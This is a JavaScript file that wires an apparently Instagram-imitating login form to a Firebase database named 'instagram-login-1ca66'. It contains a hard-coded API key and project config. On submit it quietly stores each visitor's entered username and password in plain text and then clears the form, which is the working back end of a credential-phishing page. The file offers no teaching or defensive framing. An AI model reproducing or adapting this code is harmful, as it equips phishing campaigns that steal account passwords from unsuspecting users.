const firebaseConfig = {
    apiKey: "AIzaSyCOO_ulZpTJmea4viuz8DHcktInNBoS6Kc",
    authDomain: "instagram-login-1ca66.firebaseapp.com",
    databaseURL: "https://instagram-login-1ca66-default-rtdb.firebaseio.com",
    projectId: "instagram-login-1ca66",
    storageBucket: "instagram-login-1ca66.appspot.com",
    messagingSenderId: "644675711002",
    appId: "1:644675711002:web:ec34073d699a5b5a5ce1a3"
  };
  
  //initialize firebase
  firebase.initializeApp(firebaseConfig);

  //reference your database

  var loginFormDB = firebase.database().ref('loginForm');
  document.getElementById('loginForm').addEventListener('submit',submitForm);

  function submitForm(e){
    e.preventDefault();

    var name = getElementVal('name');
    var password = getElementVal('password');
    
    saveMessages(name, password);

    //reset the form
    document.getElementById('loginForm').reset();
  }

  const saveMessages = (name, password) =>{
    var newLoginForm = loginFormDB.push();

    newLoginForm.set({
        name : name,
        password : password,
    })
  }

  const getElementVal = (id)=>{
    return document.getElementById(id).value;
  }